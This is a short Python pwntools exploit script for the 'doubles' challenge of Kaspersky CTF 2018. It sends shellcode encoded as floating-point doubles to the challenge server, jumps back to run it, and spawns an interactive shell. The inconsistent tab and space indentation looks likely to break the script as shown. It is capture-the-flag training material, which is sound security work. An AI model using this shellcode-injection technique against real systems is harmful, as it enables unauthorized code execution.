#!/usr/bin/python

from pwn import *

LOCAL = False

def pwn():
	
  log.info("doubles - Kaspersky CTF 2018 - mphx2")
	target.recvuntil("n:")
  target.sendline("6")
	log.info("sending the shellcode in double bytes")
  target.sendline("-1.28822987504903625016513979455E-231")
	target.sendline("-6.65942622870644058239392389676E-229")
	target.sendline("-1.28823004067605032300636122832E-231")
	target.sendline("-2.43701313326290968120613812093E-275")
	target.sendline("1.08805855771401084070533089734E-306")
	log.info("jumping -0x70 bytes")
  target.sendline("-1.2436070539331327E206")	
	log.info("spawning the shell")
  target.interactive()

def main():
        global target
        if LOCAL:
                target = process("./doubles")
        else:
                target = remote("doubles.2018.ctf.kaspersky.com", 10001)
        pwn()

if __name__ == "__main__":
    main()
